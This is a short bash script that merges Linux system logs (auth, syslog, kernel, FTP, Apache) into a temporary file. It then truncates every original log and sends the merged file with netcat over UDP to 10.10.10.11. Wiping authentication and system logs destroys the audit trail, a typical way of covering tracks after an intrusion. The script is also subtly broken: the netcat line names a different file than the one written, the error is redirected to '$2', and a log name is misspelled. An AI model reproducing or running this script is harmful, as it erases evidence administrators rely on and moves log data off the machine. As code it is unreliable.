#!/bin/bash
OUT_LOG_FILE="/tmp/combine_logs.log"

if [ ! -f "$OUT_LOG_FILE" ]; then
  touch "$OUT_LOG_FILE"
fi

LOG_FILES=(
  "/var/log/auth.log AUTH"
  "/var/log/syslog SYSLOG"
  "/var/log/kern.log KERNEL"
  "/var/log/deamon.log DEAMON"
  "/var/log/user.log USERLOG"
  "/var/log/messages MESSAGES"
  "/var/log/vsftpd.log VSFTPD"
  "/var/log/apache2/access.log APACHE"

)
for entry in "${LOG_FILES[@]}"; do
  set -- entry
  LOG_FILE=$(echo $entry | awk '{print $1}')
  LOG_TYPE=$(echo $entry | awk '{print $2}')
  if [ -f "$LOG_FILE" ]; then
    while IFS= read -r line; do
      echo "[$LOG_TYPE] $line" >> "$OUT_LOG_FILE"
    done < "$LOG_FILE"
    else
      echo "Log File $LOG_FILE Not Found" >$2
    fi
done

echo "Combined Log File Created At $OUT_LOG_FILE"

for clear in "${LOG_FILES[@]}"; do
  set -- clear
  CLEAR_LOG_FILE=$(echo $clear | awk '{print $1}')
  > "$CLEAR_LOG_FILE"
done

nc -u -w 5 10.10.10.11 514 < /tmp/combined_logs.log

echo "" > "$OUT_LOG_FILE"
